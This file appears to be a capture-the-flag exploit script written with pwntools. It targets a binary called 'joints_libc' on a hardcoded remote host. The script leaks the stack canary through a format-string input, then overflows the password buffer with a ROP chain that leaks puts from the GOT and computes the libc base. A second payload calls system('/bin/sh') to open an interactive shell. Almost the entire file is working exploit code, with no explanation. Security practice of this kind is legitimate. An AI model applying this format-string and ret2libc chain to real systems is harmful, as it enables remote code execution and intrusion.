from pwn import *

HOST = "34.101.234.148"
PORT = "8312"

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(HOST, PORT, *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (brea kpoints etc)

"""
b *add_password+113
b *add_password+133
"""
gdbscript = """
init-pwndbg
b *add_password+302
c
c
""".format(
    **locals()
)

# Binary filename
exe = "./joints_libc"
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.terminal = "tmux splitw -h".split(" ")
context.log_level = "debug"

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
libc = ELF("./libc.so.6")
# ld = ELF("./ld-2.27.so")

CANARY_LEAK_LOCATION = b"-%23$p"

# Start program
io = start()

rop = ROP(elf)

# ========= Leak canary

io.sendlineafter(b"Enter choice: ", b"1")
io.sendlineafter(b"Enter password name: ", CANARY_LEAK_LOCATION)
io.recvuntil(b"-")
CANARY_LEAK = int(io.recvline().decode(), 16)

info("CANARY LEAK: " + hex(CANARY_LEAK))

# ========= Leak PUTS
rop.call("puts", [elf.got.puts])
rop.call("main")
payload = b"\x00" + b"A" * 31 + p32(CANARY_LEAK) + b"A" * 12 + rop.chain() + b"\x00"

io.sendlineafter(b"Enter your password: ", payload)

PUTS = u32(io.recvline().rstrip()[:4])
info("PUTS: " + hex(PUTS))

libc.address = PUTS - libc.symbols.puts

# ========= Ret2libc
rop = ROP(libc)
rop.call("system", [next(libc.search(b"/bin/sh"))])
payload = b"\x00" + b"A" * 31 + p32(CANARY_LEAK) + b"A" * 12 + rop.chain() + b"\x00"

io.sendlineafter(b"Enter choice: ", b"1")
io.sendlineafter(b"Enter password name: ", CANARY_LEAK_LOCATION)
io.sendlineafter(b"Enter your password: ", payload)

io.interactive()
